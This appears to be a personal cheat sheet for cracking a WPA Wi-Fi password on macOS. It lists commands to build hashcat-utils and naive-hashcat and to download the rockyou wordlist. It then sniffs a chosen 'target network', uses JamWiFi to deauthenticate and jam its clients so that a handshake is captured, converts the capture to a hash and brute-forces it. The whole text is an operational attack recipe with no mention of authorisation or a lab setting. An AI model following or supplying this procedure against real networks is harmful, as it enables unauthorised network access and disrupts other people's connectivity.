# wifi

        - guide
        https://github.com/brannondorsey/wifi-cracking/blob/master/appendix.md

        - build hashcat-utils (to convert cap to hash)
        cd wifi
        git clone https://github.com/hashcat/hashcat-utils
        gcc -o ./cap2hccapx ./hashcat-utils/src/cap2hccapx.c

        - build naive-hashcat (to crack hash)
        cd wifi
        git clone https://github.com/brannondorsey/naive-hashcat
        cd naive-hashcat
        ./build-hashcat-osx.sh

        - download 130M wordlist
        cd wifi/naive-hashcat
        curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

        - sniff
        mac -> wireless diagnostic tool
                -> window -> scan -> find the target network, note its channel and width
                -> window > sniffer

        - wait / deauth
        JamWiFi.app -> scan -> select target -> deauth -> jam -> do it

        - convert to hash by hashcat-utils
        cd wifi
        ./cap2hccapx /var/tmp/xxx.pcap /var/tmp/handshake.hccapx

        - start cracking
        cd wifi/naive-hashcat
        HASH_FILE=/var/tmp/handshake.hccapx POT_FILE=./cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh

        once done, open cracked.pot with ppt
